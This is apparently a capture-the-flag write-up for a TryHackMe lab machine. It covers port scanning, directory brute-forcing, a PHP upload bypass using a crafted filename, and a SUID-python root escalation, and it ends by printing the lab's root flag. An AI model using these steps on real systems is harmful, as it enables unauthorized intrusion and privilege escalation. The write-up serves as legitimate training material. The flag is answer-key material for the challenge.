#服务发现
```
┌──(root💀kali)-[~]
└─# nmap -sV -Pn 10.10.15.221                                                                                                                                                                                                         255 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 05:00 EDT
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.60% done; ETC: 05:01 (0:00:11 remaining)
Nmap scan report for 10.10.15.221
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.85 seconds
```


#目录爆破,发现上传路径/panel
```
┌──(root💀kali)-[~]
└─# gobuster dir -u 10.10.15.221 -w /usr/share/wordlists/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/17 05:02:45 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.15.221/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.15.221/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.15.221/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.15.221/panel/] 
```


#上传绕过
因为apache的版本是2.4.29，存在一个一个文件解析漏洞，参考https://book.hacktricks.xyz/pentesting-web/file-upload绕过
burpsuite抓包，修改filename

```filename="1.php.\"```

#查找所有SUID文件
```
find / -user root -perm /4000

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

#利用python提权
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
